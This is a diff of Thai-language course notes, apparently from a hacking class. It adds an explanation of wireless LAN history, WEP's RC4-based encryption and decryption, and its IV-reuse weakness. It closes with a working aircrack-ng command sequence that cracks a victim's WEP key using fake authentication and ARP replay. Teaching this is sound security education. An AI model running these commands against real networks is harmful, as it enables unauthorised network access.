@@ -1905,9 +1905,51 @@ python2 ./shell.py
 
 ## Week 14@25 Feb 2023
 
-WIFI crack
+Wireless 
+- Wireless LAN นั้นได้ถูกเริ่มพัฒนาและทดลองใช้งานในปี 1980 โดยใช้ความถี่ 900 MHz ต่อมาในปี 1992 ทาง IEEE(Institude of Electrical and Electronics Engineers) ได้มีการแบ่งการใช้งาน Wireless LAN ออกมา 3 กลุ่ม ได้แก่ กลุ่มที่ใช้ความถี่ 2.4 GHz , กลุ่มที่ใช้ความถี่ 5 GHz และกลุ่มที่ใช้ความถี่ย่านอินฟราเรด(infrared)  ซึ่งความถี่ที่นิยมใช้มากที่สุดคือ ย่านความถี่ 2.4 GHz
+- รูปแบบการเข้ารหัส การใช้งาน Wireless LAN นั้นสามารถถูกดักจับข้อมูลได้อย่างง่ายดาย ดังนั้นการเข้ารหัสจึงเป็นทางออกที่ดีที่สุดในการป้องกันการถูกดักจับข้อมูลและการป้องกันการเข้าใช้งานระบบ Wireless LAN ซึ่งมีการเข้ารหัสตามมาตรฐานดังนี้คือ WEP, WPA และ WPA-2
+1. WEP(Wired Equivalent Privacy) มีการเข้ารหัสโดยใช้ Algorithm RC4 ซึ่งเป็นการเข้ารหัสแบบ Symmetric Key Stream โดยจะมีขั้นตอนการใ้ช้งานระหว่าง Client และ Access Point ดังนี้
+  - Client ทำการร้องขอไป Access Point เพื่อทำการเข้าใช้ระบบ Network
+  - Access Point ตอบกลับและส่ง Challenge Text ซึ่งเป็นข้อความแบบสุ่มไปให้
+  - Client ได้รับ Challenge Text แล้วทำการเข้ารหัสด้วย WEP Key ที่กำหนดไว้ตั้งแต่เริ่มสร้างระบบ  แล้วส่งกลับไปให้ Access Point
+  - ถ้า Access Point สามารถถอดรหัสข้อความ  แล้วมีค่าตรงกับ Challenge Text ที่ส่งไปก่อนหน้านี้  แล้ว Access Point ก็จะให้ Client สามารเข้ามาใช้งานภายใน network ได้
 
-Web Hacking
+  - การเข้ารหัส
+    1. นำ password ที่เราสร้างขึ้นมาขนาดความยาว 40 หรือ 104 บิต มาต่อเข้ากับ IV(Initialization Vector) โดย IV Key นั้นเกิดจากการสุ่มขึ้นมามีขนาด 24 บิต 
+    2. นำเอาค่าข้อมูลดิบมาเข้ารหัสด้วย CRC-32 (32-bit Cyclic Redundant Check) จะได้เป็น Integrity Check Value(ICV)ขนาด 32 บิต แล้วนำ ICV ไปต่อกับข้อมูลดิบที่ยังไม่ได้ทำการเข้ารหัส
+    3. Key Stream ที่มีขนาดเท่ากับ Data +ICV จะถูกสร้างขึ้นโดยนำการนำเอาผลลัพท์ที่ได้จากในข้อหนึ่งมาสุ่มนั่นเอง  โดยตัวที่จะทำหน้าที่สุ่มนั้นเรียกว่า PRNG(Pseudo-Random Number Generator)หรือที่เรียกว่า RC4 นั่นเอง
+    4. นำ Key Stream และ Data + ICV มาทำการ XOR แบบบิตต่อบิต จะได้เป็น Encrypted Message นั่นเอง
+    5. จากนั้นระบบจะทำการส่ง IV + Encrypted Message  ไปยัง Client
+
+  - การถอดรหัส
+
+    1. นำ password ที่เราสร้างขึ้นขนาดความยาว 40 หรือ 104 บิต ซึ่งเหมือนกับข้อ 1 ของการเข้ารหัสมาทำการต่อกับ IV ที่ได้รับมาพร้อมกับ Encrypted Message
+    2. นำผลลัพท์ที่ได้ไปเข้า PRNG เพื่อทำการสร้าง Key Stream ที่มีขนาดเท่ากับความยาวของ Encrypted Message ที่ได้รับ
+    3. นำ Key Stream นั้นเอามาทำการ XOR กับ Encrypted Message  จะได้ออกมาเป็น Data + ICV
+    4. นำเอา Data นั้นไปเข้า CRC-32 เพื่อทำการสร้าง ICV อีกครั้ง
+    5. นำเอา ICV ที่ได้จากการถอดรหัส XOR และ ICV ที่ได้จากการนำ Data มาเข้ารหัส  มาเปรียบเทียบกัน  ซึ่งหากตรงกันก็สรุปได้ว่า Data นั้นถูกถอดรหัสได้อย่างถูกต้องแล้ว  อีกทั้งยังบ่งบอกได้ด้วยว่า Client นั้นได้รับอนุญาตในการเข้าใช้งาน network หรือไม่
+
+  - ช่องโหว่ของ WEP
+
+    - ช่องโหว่ของ WEP นั้นเกิดจากที่ความยาวที่น้อยเกินไปของ IV และ password ที่คงที่ ซึ่ง WEP นั้นเมื่อเวลาผ่านไปนานๆจะมี data packet ที่ใช้ IV ซ้ำของเก่านั่นเอง เมื่อผู้โจมตีรวบรวมข้อมูลได้ระยะหนึ่งที่ได้ IV เดียวกันหลายๆ packet ก็จะทำให้สามารถหา password ได้นั่นเอง และมีโปรแกรมหลายตัวสำหรับการโจมตี WEP เช่น aircrack-ng , gerix , airsnort เป็นต้น โดยวิธีการโจมตีนั้นจะทำดังนี้
+    ตัวอย่างการCrack WEP
+    
+    ```bash
+    iwconfig
+    ifconfig wlan0 up
+    iwlist wlan0 scan
+    airmon-ng start wlan0
+    airodump-ng -w wep-file.cap -c 10 wlan0
+    #  fake authentication
+    aireplay-ng -1 0 -e <SSID Victim> -a <MAC Access Point Victim> -h <MAC Address Attacker> wlan0
+
+    # arp request packet to Victim Access Point
+    aireplay-ng -3 -b <MAC Access Point Victim> -h <MAC Address Attacker> wlan0
+
+    aircrack-ng -b <MAC Access Point Victim> wep-file*.cap
+    ```
+
+
 
 กฎหมายที่เกี่ยวข้อง
 
